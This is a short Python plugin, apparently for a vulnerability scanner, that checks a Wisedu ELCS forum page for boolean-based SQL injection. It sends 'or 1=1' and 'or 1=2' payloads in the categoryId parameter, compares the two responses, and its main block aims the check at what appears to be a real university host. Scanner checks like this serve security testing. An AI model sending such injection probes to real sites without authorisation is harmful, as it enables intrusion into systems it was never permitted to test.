#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2010-071006

import random
def assign(service, arg):
    if service == "wisedu_elcs":
        return True, arg


def audit(arg):
    true_url = arg + 'elcs/forum/forumIndexAction!init.action?categoryId=-11%20or%201=1'
    false_url = arg+ 'elcs/forum/forumIndexAction!init.action?categoryId=-11%20or%201=2'
    check = '<div class=categorycontent>  <table class=cateContentTable><tr class="headerTop"  >'
    code, head,res1, errcode, _ = curl.curl2(true_url)
    code, head,res2, errcode, _ = curl.curl2(false_url)
    if check  in res1 and check not in res2:
        security_hole(true_url)

                        

if __name__ == '__main__':
    from dummy import *
    audit(assign('wisedu_elcs', 'http://dr.gcp.edu.cn/')[1])